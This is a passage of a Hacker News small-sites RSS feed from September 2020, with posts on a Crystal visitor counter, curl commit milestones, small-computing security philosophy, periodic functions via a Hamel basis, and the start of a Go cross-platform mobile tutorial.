href="https://carbon.now.sh/?bg=rgba(171%2C%20184%2C%20195%2C%201)&amp;t=seti&amp;wt=none&amp;l=crystal&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=2x&amp;wm=false&amp;code=private%2520def%2520increase_total_visits(ip)%250A%2520%2520%2520%2520if%2520%2540redis.exists(%2522!%2523%257Bip%257D%2522)%2520%253D%253D%25200%250A%2520%2520%2520%2520%2520%2520%2520%2520%2540redis.incr(TOTAL_VISITS_KEY).to_i%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2540redis.set(%2522!%2523%257Bip%257D%2522%252C%25201%252C%2520RATE_LIMIT_SECONDS)%250A%2520%2520%2520%2520end%250Aend"><img src="https://www.techprowd.com/content/images/2020/09/carbon--37-.png" alt="carbon--37-"></a></p>
<!--kg-card-end: markdown--><p>This way now only increases total visits only when the rate limit timeout will be reached; in this code, it's 5 seconds, but I am going to set something like 1 minute in production.</p><p>Now that we have our application working as we expect. We should deploy our application. I am going to follow the official <a href="https://crystal-lang.org/2016/05/26/heroku-buildpack.html">Crystal guide for Heroku deployment</a>.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-82.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-82.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/image-82.png 1000w, https://www.techprowd.com/content/images/size/w1600/2020/09/image-82.png 1600w, https://www.techprowd.com/content/images/2020/09/image-82.png 1676w" sizes="(min-width: 1200px) 1200px"></figure><p>After easy set up and install now we have an working counter running on heroku.</p><p><a href="https://immense-beyond-23382.herokuapp.com/">https://immense-beyond-23382.herokuapp.com/</a></p><!--kg-card-begin: html--><p><img src="https://immense-beyond-23382.herokuapp.com/"></p><!--kg-card-end: html--><h2 id="conclusion">Conclusion</h2><p>The fully working source code is available on my <a href="https://www.patreon.com/posts/41771991">Patreon account</a> for all pledgers. I will try to add this small counter to this Ghost template as I really loved the idea of this small counter 15 years ago.</p><p>Don't forget to subscribe to the newsletters down bellow. Every new article will be delivered in a friendly email, readable format straight into your mailbox!</p>
                </div>
            </section>

                <section>
    <h3>Subscribe to techprowd</h3>
    <p>Get the latest posts delivered right to your inbox</p>
    <form data-members-form="subscribe">
        
        <p><strong>Great!</strong> Check your inbox and click the link to confirm your subscription.
        </p>
        <p>
            Please enter a valid email address!
        </p>
    </form>
</section>
            

        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://www.techprowd.com/evening-project-a-crystal-based-super-fast-visitor-counter/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24525873</guid>
            <pubDate>Sat, 19 Sep 2020 07:43:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My first 15000 curl commits]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24525665">thread link</a>) | @dosshell
<br/>
September 18, 2020 | https://daniel.haxx.se/blog/2020/09/18/my-first-15000-curl-commits/ | <a href="https://web.archive.org/web/*/https://daniel.haxx.se/blog/2020/09/18/my-first-15000-curl-commits/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>I’ve long maintained that <strong>persistence</strong> is one of the main qualities you need in order to succeed with your (software) project. In order to manage to ship a product that truly conquers the world. By continuously and never-ending keeping at it: polishing away flaws and adding good features. On and on and on.</p>



<p>Today marks the day when I landed my 15,000th commit in the <a href="https://github.com/curl/curl">master branch in curl’s git repository</a> – and we don’t do merge commits so this number doesn’t include such. Funnily enough, <a href="https://github.com/curl/curl/graphs/contributors">GitHub can’t count</a> and shows a marginally lower number.</p>



<figure><img loading="lazy" width="844" height="116" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits.png 844w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits-450x62.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits-200x27.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits-768x106.png 768w" sizes="(max-width: 844px) 100vw, 844px"></figure>



<p>This is of course a totally meaningless number and I’m only mentioning it here because it’s even and an opportunity for me to celebrate something. To cross off an imaginary milestone. This is not even a year since we passed <a href="https://daniel.haxx.se/blog/2019/11/29/curl-25000-commits/" data-type="post" data-id="12859">25,000 total number of commits</a>. Another meaningless number.</p>



<p>15,000 commits equals 57% of all commits done in curl so far and it makes me the only committer in the curl project with over 10% of the commits.</p>



<figure><a href="https://curl.haxx.se/dashboard1.html#daniel-vs-rest"><img loading="lazy" width="1200" height="675" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-1200x675.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-1200x675.png 1200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-450x253.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-200x113.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-768x432.png 768w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-1536x864.png 1536w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-2048x1152.png 2048w" sizes="(max-width: 1200px) 100vw, 1200px"></a></figure>



<p>The curl git history starts on December 29 1999, so the first 19 months of commits from the early curl history are lost. 15,000 commits over this period equals a little less than 2 commits per day on average. I reached 10,000 commits  in December 2011, so the latest 5,000 commits were done at a slower pace than the first 10,000.</p>



<p>I estimate that I’ve spent more than 15,000 hours working on curl over this period, so it would mean that I spend more than one hour of “curl time” per commit on average. According to <a href="https://curl.haxx.se/gitstats/authors.html">gitstats</a>, these 15,000 commits were done on 4,271 different days.</p>



<p>We also have other curl repositories that aren’t included in this commit number. For example, I have done over 4,400 commits in curl’s website repository.</p>



<p>With these my first 15,000 commits I’ve added 627,000 lines and removed 425,000, making an average commit adding 42 and removing 28 lines. (Feels pretty big but I figure the really large ones skew the average.)</p>



<p>The largest time gap ever between two of my commits in the curl tree is almost 35 days back in June 2000. If we limit the check to “modern times”, as in 2010 or later, there was a 19 day gap in July 2015. I <em>do</em> take vacations, but I usually keep up with the most important curl development even during those.</p>



<p>On average it is one commit done by me every 12.1 hours. Every 15.9 hours since 2010. </p>



<p>I’ve been working <a href="https://daniel.haxx.se/blog/2019/02/02/im-on-team-wolfssl/" data-type="post" data-id="11915">full time on curl since early 2019</a>, up until then it was a spare time project only for me. Development with pull-requests and CI and things that verify a lot of the work <em>before</em> merge is a recent thing so one explanation for a slightly higher commit frequency in the past is that we then needed more “oops” commits to rectify mistakes. These days, most of them are done in the PR branches that are squashed when subsequently merged into master. Fewer commits with higher quality.</p>



<h2>curl committers</h2>



<p>We have merged commits authored by over 833 authors into the curl master repository.  Out of these, 537 landed only a single commit (so far).</p>



<figure><a href="https://curl.haxx.se/dashboard1.html#authors"><img loading="lazy" width="1200" height="675" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-1200x675.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-1200x675.png 1200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-450x253.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-200x113.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-768x432.png 768w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-1536x864.png 1536w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-2048x1152.png 2048w" sizes="(max-width: 1200px) 100vw, 1200px"></a></figure>



<p>We are 48 authors who ever wrote 10 or more commits within the same year. 20 of us committed that amount of commits during more than one year.</p>



<figure><a href="https://curl.haxx.se/dashboard1.html#coreteam-per-year"><img loading="lazy" width="1200" height="675" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-1200x675.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-1200x675.png 1200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-450x253.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-200x113.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-768x432.png 768w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-1536x864.png 1536w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-2048x1152.png 2048w" sizes="(max-width: 1200px) 100vw, 1200px"></a></figure>



<p>We are 9 authors who wrote more than 1% of the commits each.</p>



<p>We are 5 authors who ever wrote 10 or more commits within the same year in 10 or more years.</p>



<p>Our second-most committer (by commit count) has not merged a commit for over seven years.</p>



<p>To reach curl’s top-100 committers list right now, you only need to land 6 commits.</p>



<h2>can I keep it up?</h2>



<p>I intend to stick around in the curl project going forward as well. If things just are this great and life remains fine, I hope that I will be maintaining roughly this commit speed for years to come. My prediction is therefore that it will take longer than another twenty years to reach 30,000 commits.</p>



<p>I’ve worked on curl and its precursors for almost <em>twenty-four years</em>. In another twenty-four years I will be well into my retirement years. At some point I will probably not be fit to shoulder this job anymore!</p>



<p>I have never planned long ahead before and I won’t start now. I will instead keep focused on keeping curl top quality, an exemplary open source project and a welcoming environment for newcomers and oldies alike. I will continue to make sure the project is able to function totally independently if I’m present or not.</p>



<h2>The 15,000th commit?</h2>



<p>So what exactly did I change in the project when I merged my 15,000th ever change into the branch?</p>



<p>It was a pretty boring and <a href="https://github.com/curl/curl/commit/559ed3ca2545c56a9acc4e805970434f657bd691">non-spectacular one</a>. I removed a document (<code>RESOURCES</code>) from the docs/ folder as that has been a bit forgotten and now is just completely outdated. There’s a much better page for this provided on the web site: <a href="https://curl.haxx.se/rfc/">https://curl.haxx.se/rfc/</a></p>



<h2>Celebrations!</h2>



<p>I of coursed asked my twitter friends a few days ago on how this occasion is best celebrated:</p>



<figure><a href="https://twitter.com/bagder/status/1302345161272418307"><img loading="lazy" width="825" height="493" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish.png 825w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish-450x269.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish-200x120.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish-768x459.png 768w" sizes="(max-width: 825px) 100vw, 825px"></a></figure>



<p>I showed these results to my wife. She approved.</p>
	</div></div>]]>
            </description>
            <link>https://daniel.haxx.se/blog/2020/09/18/my-first-15000-curl-commits/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24525665</guid>
            <pubDate>Sat, 19 Sep 2020 06:43:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Small Computing and the Security Mindset]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24525475">thread link</a>) | @zdw
<br/>
September 18, 2020 | http://www.lord-enki.net/medium-backup/2020-09-18_Small-Computing-and-the-Security-Mindset-821dfb512aa7.html | <a href="https://web.archive.org/web/*/http://www.lord-enki.net/medium-backup/2020-09-18_Small-Computing-and-the-Security-Mindset-821dfb512aa7.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
<header>

</header>
<section data-field="subtitle">
The story of modern computing is the story of the big-computing mindset (scale, centralization, elitism, and paternalism) infecting…
</section>
<section data-field="body">
<section name="3648"><div><div><h3 name="8f02" id="8f02">Small Computing and the Security&nbsp;Mindset</h3><p name="3181" id="3181">The story of modern computing is the story of the big-computing mindset (scale, centralization, elitism, and paternalism) infecting everything it touches as programming becomes more of a profession than a craft. In the process, it creates edifices of practices — useful in big-computing situations — that get unthinkingly applied outside of their appropriate bounds, forcing small-computing projects into the strictures of big-computing design. One major domain where we must begin to think critically about the big- vs small-computing distinction is security.</p><p name="46d1" id="46d1">Small-computing systems ought to be secure. After all, they are our most personal environments! They are our diaries and our artworks and our dream journals! But computer security, as it has become professionalized, has become more and more focused on big-computing environments, and good security practices in those environments are inimical to the basic tenets of small computing.</p><p name="369b" id="369b">In a big-computing environment, valuable secrets (like credit card numbers) and desirable powers (like the ability to tweet on behalf of the president) are kept on a set of machines owned by a single entity (the corporation) on behalf of the ostensible owners of that information and power (particular end-users) and protected from illegitimate access (hacking/cracking) by an elite set of professionals (software engineers, ops teams, security consultants) who use their monopoly on legitimate access to certain power (superuser &amp; administrator privileges, commit access) to construct laws (security policies) that prohibit as many not-explicitly-allowed operations as possible. Because the adversaries are many, with infinite time and energy, and because the treasure is valuable, and because laws always have unseen loopholes, these elite professionals construct layers upon layers of rules to limit not only what users (legitimate or illegitimate) can do, but what kind of feedback they can receive.</p><p name="c145" id="c145">This mentality has even made its way into language design: Java (and C++) have a rudimentary form of access control where members can be marked private, and good style in these languages is to mark all member data as private and write accessor functions, ostensibly in order to perform validity checks on proposed modification. This boilerplate is added rather than doing the sensible thing and creating custom metatables such that assignments are implicitly passed through an integrity check (as may be done in Python and Lua). Of course, such checks are rarely implemented, and they cannot distinguish between ‘authorized’ and ‘unauthorized’ calling-classes anyhow — while C++ has ‘friend classes’ that can modify private data directly, and both support using inheritance hierarchies to control data access, there is no granularity smaller than kin/friend versus outsider, so these access controls are borderline useless for everything besides the ad-hoc plugging failures of the type system and increasing the line count of codebases.</p><p name="c4c2" id="c4c2">Systems that require big-computing style security exist. Problems that are best suited to those systems also exist — your bank ought to not only have big-computing style security, but ought to have substantially better security than it has. But, this model is not really sensible in many of the places it is used. For instance, Google Docs (which simulates a word processor with some limited support for simultaneous editing by multiple users) is locked into this model only because it is client-server, and a hypothetical local-first or peer-to-peer version should not be so professionalized and stratified; Microsoft Word, being a local application, has no legitimate excuse (though the real reason, as with most big-computing systems, is that unnecessary centralization is a very effective way to squeeze money out of users who don’t know any better).</p><p name="d95a" id="d95a">When I use Google Docs, I can modify the javascript running on my browser, modify the cookies being sent to the server, and modify URL parameters. If I do something wrong, I will get an entirely unhelpful error message from inside the black box of the remote server. This is because, by failing to fall precisely in line with the Alphabet Corporation’s desired behavior, I have become an adversary, and adversaries cannot be given information that might help them do whatever they might want to do (since some of the things they might want to do is get, for instance, the credit card numbers of everyone who has ever bought an advertisement). Of course, Google engineers writing and maintaining Google Docs face the same situation. Outside of an adversarial situation, investigating a poorly-understood piece of code by poking it and interpreting error messages is called debugging, and part of the small computing ethos is that users should not be prevented from debugging.</p><p name="05d7" id="05d7">The difference between big computing and small computing is, in essence, that in small computing, the user is never an adversary. This is because the running code is owned and controlled by the user. This goes beyond open source / free software (where the developer is no adversary, but the developer is an elite professional often working on behalf of a corporation inside a firewall, performing work that may well be detrimental to those who actually need to interact with its effects).</p><p name="bd41" id="bd41">What kinds of structures befit a small-computing system in an environment where networking exists, and what security models are appropriate for these structures?</p><p name="8df4" id="8df4">For one thing, a multi-user client-server model makes no sense. In a client-server model, whoever controls the single server functionally controls all clients. There is, therefore, incentive to hoard power by locking vital functionalities away on the shared server, making every client dependent — slowed by latency when online, shit out of luck when offline, and always under threat of sudden unilateral changes in policy or protocol.</p><p name="d853" id="d853">Instead, we should look to peer to peer systems: direct for real-time communication, and offline-first store-and-forward schemes for everything else. Asymmetric encryption for key exchange and for signing still make sense here, as does hash-based content addressing for storage. Secure Scuttlebutt and IPFS are good models for what small-computing-oriented network technologies of the future might look like: fully distributed, yet resistant to the kinds of threats that regularly take down federated systems like ActivityPub and IRC, because all nodes are equal and all nodes replicate for each other (under cryptographically-enforced anti-spoofing measures).</p><p name="32c0" id="32c0">What does a threat model for small-computing infrastructure look like?</p><p name="2535" id="2535">Well, unlike in big-computing systems, a small-computing system does not (typically) have large numbers of highly motivated dedicated attackers. Fuzzy Bear isn’t APTing your grandma’s laptop, because your grandma’s laptop has nothing on it but christmas MIDIs and questionable nudes. Our threat is really from folks doing large-scale automated sweeps for low-hanging fruit. So, small-computing threat modeling looks like everyday opsec: use encryption, don’t give strangers direct access to private spaces and limit the spaces they do have access to, distinguish between sensitive and non-sensitive data, and protect the integrity of the system from outsiders. Protect the network-facing portion of your machine, while maximizing your own access to it.</p><p name="aa5a" id="aa5a">In this context, technologies we absolutely do not need are: passwords, SSO, certificate authority hierarchies, name servers and host files, NAT firewalls, code signing, chroot jails, memory layout randomizers, executable symbol stripping, single-application containers, daemons running as ‘nobody’, web APIs for wrapping the web APIs around your web APIs, friend classes, and sudo.</p><p name="9477" id="9477">Technologies we might want to look into: distributed hash tables, chord routing, merkel trees, functional languages, JIT, fast copy-on-write, network-aware cache eviction policies, split-brain countermeasures, transitive blocking, store and forward, message passing, microversioning, journaling, and image-based environments.</p></div></div></section>
</section>
</article></div>]]>
            </description>
            <link>http://www.lord-enki.net/medium-backup/2020-09-18_Small-Computing-and-the-Security-Mindset-821dfb512aa7.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24525475</guid>
            <pubDate>Sat, 19 Sep 2020 05:54:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[From Vector Spaces to Periodic Functions]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24525383">thread link</a>) | @susam
<br/>
September 18, 2020 | https://susam.in/blog/from-vector-spaces-to-periodic-functions/ | <a href="https://web.archive.org/web/*/https://susam.in/blog/from-vector-spaces-to-periodic-functions/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>By <b>Susam Pal</b> on 30 Jan 2019</p>
<h2 id="vector-spaces"><a href="#vector-spaces">Vector Spaces</a></h2>
<p>
A fascinating result that appears in linear algebra is the fact that the
set of real numbers \( \mathbb{R} \) is a vector space over the set of
rational numbers \( \mathbb{Q}. \) This may appear surprising at first
but it is easy to show that it is indeed so by checking that all eight
axioms of vector spaces hold good:
</p>

<ol>
  <li>
    <p>
      Commutativity of vector addition:<br>
      \( x + y = y + x \) for all \( x, y \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Associativity of vector addition:<br>
      \( x + (y + z) = (x + y) + z \) for all \( x, y, z \in \mathbb{R}.
      \)
    </p>
  </li>
  <li>
    <p>
      Existence of additive identity vector:<br>
      We have \( 0 \in \mathbb{R} \) such that \( x + 0 = x \) for all
      \( x \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Existence of additive inverse vectors:<br>
      There exists \( -x \in \mathbb{R} \) for all \( x \in \mathbb{R}.
      \)
    </p>
  </li>
  <li>
    <p>
      Associativity of scalar multiplication:<br>
      \( a(bx) = (ab)x \) for all \( a, b \in \mathbb{Q} \) and for all
      \( x \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Distributivity of scalar multiplication over vector addition:<br>
      \( a(x + y) = ax + by \) for all \( a \in \mathbb{Q} \) and for
      all \( x, y \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Distributivity of scalar multiplication over scalar addition:<br>
      \( (a + b)x = ax + bx \) for all \( a, b \in \mathbb{Q} \) and for
      all \( x \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Existence of scalar multiplicative identity:<br>
      We have \( 1 \in \mathbb{Q} \) such that \( 1 \cdot x = x \) for
      all \( x \in \mathbb{R}. \)
    </p>
  </li>
</ol>
<p>
  This shows that the set of real numbers \( \mathbb{R} \) forms a
  vector space over the field of rational numbers \( \mathbb{Q}. \)
  Another quick way to arrive at this fact is to observe that \(
  \mathbb{Q} \subseteq \mathbb{R}, \) that is, \( \mathbb{Q} \) is a
  subfield of \( \mathbb{R}. \) Any field is a vector space over any of
  its subfields, so \( \mathbb{R} \) must be a vector space over \(
  \mathbb{Q}. \)
</p>


<h2 id="problem"><a href="#problem">Problem</a></h2>

<p>
Here is an interesting problem related to vector spaces that I came
across recently:
</p>

<div>
<p>
Define two periodic functions \( f \) and \( g \) from \( \mathbb{R} \)
to \( \mathbb{R} \) such that their sum \( f + g \) is the identity
function. The axiom of choice is allowed.
</p>
<p>
A function \( f \) is periodic if there exists \( p \gt 0 \) such that
\( f(x + p) = f(x) \) for all \( x \) in the domain.
</p>
</div>

<p>
<em>
If you want to think about this problem, this is a good time to pause
and think about it. There are spoilers ahead.
</em>
</p>


<h2 id="solution"><a href="#solution">Solution</a></h2>

<p>
The axiom of choice is equivalent to the statement that every vector
space has a basis. Since the set of real numbers \( \mathbb{R} \) is a
vector space over the set of rational numbers \( \mathbb{Q}, \) there
must be a basis \( \mathcal{H} \subseteq \mathbb{R} \) such that every
real number \( x \) can be written uniquely as a finite linear
combination of elements of \( \mathcal{H} \) with rational coefficients,
that is,
\[
  x = \sum_{a \in \mathcal{H}} x_a a
\]
where each \( x_a \in \mathbb{Q} \) and \( \{ a \in \mathcal{H} \mid x_a
\ne 0 \} \) is finite. The set \( \mathcal{H} \) is also known as the
Hamel basis.
</p>

<p>
We know that \( b_a = 0 \) for distinct \( a, b \in \mathcal{H} \)
because \( a \) and \( b \) are basis vectors.
</p>

<p>
In the above expansion of \( x, \) each \( x_a \) is a rational number
that appears as the coefficient of the basis vector \( a. \) Therefore
\( (x + y)_{a} = x_a + y_a \) for all \( x, y \in \mathbb{R}. \) Thus \(
(x + b)_{a} = x_a + b_a = x_a + 0 = x_a. \) This shows that a function
\( f(x) = x_a \) is a periodic function with period \( b \) for any \( b
\in \mathcal{H} \setminus \{a\}. \)
</p>

<p>
Let us define two functions:
\begin{align*}
  f(x) &amp; = \sum_{a \in \mathcal{H} \setminus \{ b \}} x_a a,
  &amp;
  g(x) &amp; = x_b b.
\end{align*}
where \( b \in \mathcal{H} \) and \( x \in \mathbb{R}. \) Let us
choose \( c \in \mathcal{H} \) such that \( c \ne b. \) Then \( f(x) \)
is a periodic function with period \( b \) and \( g(x) \) is a periodic
function with period \( c. \) Further,
\[
  f(x) + g(x)
  = \left( \sum_{a \in \mathcal{H} \setminus \{ b \}} x_a a \right) + x_b b
  = \sum_{a \in \mathcal{H}} x_a a
  = x.
\]
Thus \( f(x) \) and \( g(x) \) are two periodic functions such that
their sum is the identity function.
</p>


<h2 id="references"><a href="#references">References</a></h2>
<ul>
  <li>
    <a href="https://mathworld.wolfram.com/VectorSpace.html">Vector
    Space</a> (by Eric W. Weisstein)
  </li>
  <li>
    <a href="https://web.archive.org/web/20141026224511/https://drexel28.wordpress.com/2010/10/22/the-dimension-of-r-over-q/">The
    Dimension of R over Q</a> (by Alex Youcis)
  </li>
  <li>
    <a href="https://mathblag.wordpress.com/2013/09/01/sums-of-periodic-functions/">Sums
  of Periodic Functions</a> (by David Radcliffe)
  </li>
</ul>



</div></div>]]>
            </description>
            <link>https://susam.in/blog/from-vector-spaces-to-periodic-functions/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24525383</guid>
            <pubDate>Sat, 19 Sep 2020 05:29:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hand-Optimizing VLIW Assembly Language as a Game]]>
            </title>
            <description>
<![CDATA[
Score 56 | Comments 31 (<a href="https://news.ycombinator.com/item?id=24525372">thread link</a>) | @luu
<br/>
September 18, 2020 | http://silverspaceship.com/hovalaag/ | <a href="https://web.archive.org/web/*/http://silverspaceship.com/hovalaag/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://silverspaceship.com/hovalaag/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24525372</guid>
            <pubDate>Sat, 19 Sep 2020 05:27:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Running Go Code on iOS and Android]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24525336">thread link</a>) | @nnx
<br/>
September 18, 2020 | https://rogchap.com/2020/09/14/running-go-code-on-ios-and-android/ | <a href="https://web.archive.org/web/*/https://rogchap.com/2020/09/14/running-go-code-on-ios-and-android/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
        <p>In this tutorial we'll be building a simple Go package that you can run from an iOS application (Swift) and also an
Android application (Kotlin).</p>
<p>This tutorial does <strong>NOT</strong> use the <a href="https://github.com/golang/mobile">Go Mobile</a>
framework; instead it uses Cgo to build the raw static (iOS) and shared (Android) C library that can be imported into your
mobile project (which is what the Go Mobile framework does under-the-hood).</p>
<h2 id="setup">Setup</h2>
<p>For this tutorial we'll create a simple monorepo with the following structure:</p>
<pre><code>.
├── android/
├── go/
│   ├── cmd/
│   │   └── libfoo/
│   │       └── main.go
│   ├── foo/
│   │   └── foo.go
│   ├── go.mod
│   └── go.sum
└── ios/
</code></pre><div><pre><code data-lang="zsh">$ mkdir -p android ios go/cmd/libfoo go/foo
</code></pre></div><p>We'll start with the Go code and come back to creating the iOS and Android projects later.</p>
<div><pre><code data-lang="zsh">$ <span>cd</span> go
$ go mod init rogchap.com/libfoo
</code></pre></div><h2 id="foo-package">Foo package</h2>
<div><pre><code data-lang="go"><span>// go/foo/foo.go
</span><span></span><span>package</span> foo

<span>// Reverse reverses the given string by each utf8 character
</span><span></span><span>func</span> <span>Reverse</span>(in <span>string</span>) <span>string</span> {
    n <span>:=</span> <span>0</span>
    <span>rune</span> <span>:=</span> <span>make</span>([]<span>rune</span>, <span>len</span>(in))
    <span>for</span> _, r <span>:=</span> <span>range</span> in { 
        <span>rune</span>[n] = r
        n<span>++</span>
    } 
    <span>rune</span> = <span>rune</span>[<span>0</span>:n]
    <span>for</span> i <span>:=</span> <span>0</span>; i &lt; n<span>/</span><span>2</span>; i<span>++</span> { 
        <span>rune</span>[i], <span>rune</span>[n<span>-</span><span>1</span><span>-</span>i] = <span>rune</span>[n<span>-</span><span>1</span><span>-</span>i], <span>rune</span>[i] 
    } 
    <span>return</span> <span>string</span>(<span>rune</span>)
}
</code></pre></div><p>Our <code>foo</code> package has a single function <code>Reverse</code> that has a single string argument <code>in</code> and a single string output.</p>
<h2 id="export-for-c">Export for C</h2>
<p>In order for our C library to call our <code>foo</code> package we need to export all the functions that we want to expose to C
with the special <code>export</code> comment.
This wrapper needs to be in the <code>main</code> package:</p>
<div><pre><code data-lang="go"><span>// go/cmd/libfoo/main.go
</span><span></span>pacakge main

<span>import</span> <span>"C"</span>

<span>// other imports should be seperate from the special Cgo import
</span><span></span><span>import</span> (
    <span>"rogchap.com/libfoo/foo"</span>
)

<span>//export reverse
</span><span></span><span>func</span> <span>reverse</span>(in <span>*</span>C.char) <span>*</span>C.char {
    <span>return</span> C.<span>CString</span>(foo.<span>Reverse</span>(C.<span>GoString</span>(in)))
}

<span>func</span> <span>main</span>() {}
</code></pre></div><p>We're using the special <code>C.GoString()</code> and <code>C.CString()</code> functions to convert between Go string and a C string.</p>
<p><em>Note:</em> The function that we are exporting does not need to be an exported Go function (ie. starts with a Captial
letter). Also note the empty <code>main</code> function; this is required for the Go code to compile otherwise you'll get a
<code>function main is undeclared in the main package</code> error.</p>
<p>Let's test our build by creating a static C library using the Go <code>-buildmode</code> flag:</p>
<pre><code>go build -buildmode=c-archive -o foo.a ./cmd/libfoo
</code></pre><p>This should have outputed the C library: <code>foo.a</code> and the header file: <code>foo.h</code>. You should see our exported
function at the bottom of our header file:</p>
<div><pre><code data-lang="C"><span>extern</span> <span>char</span><span>*</span> <span>reverse</span>(<span>char</span><span>*</span> in);
</code></pre></div><h2 id="building-for-ios">Building for iOS</h2>
<p>Our goal is to create a <a href="https://en.wikipedia.org/wiki/Fat_binary">fat binary</a> that can be used on iOS devices and the
iOS simulator.</p>
<p>The Go standard library includes a script for building for iOS:
<a href="https://golang.org/misc/ios/clangwrap.sh"><code>$GOROOT/misc/ios/clangwrap.sh</code></a>, however this script only builds for
<code>arm64</code>, and we need <code>x86_64</code> too for the iOS Simulator. So, we're going to create our own <code>clangwrap.sh</code>:</p>
<div><pre><code data-lang="sh"><span>#!/bin/sh
</span><span></span>
<span># go/clangwrap.sh</span>

<span>SDK_PATH</span><span>=</span><span>`</span>xcrun --sdk <span>$SDK</span> --show-sdk-path<span>`</span>
<span>CLANG</span><span>=</span><span>`</span>xcrun --sdk <span>$SDK</span> --find clang<span>`</span>

<span>if</span> <span>[</span> <span>"</span><span>$GOARCH</span><span>"</span> <span>=</span><span>=</span> <span>"amd64"</span> <span>]</span>; <span>then</span>
    <span>CARCH</span><span>=</span><span>"x86_64"</span>
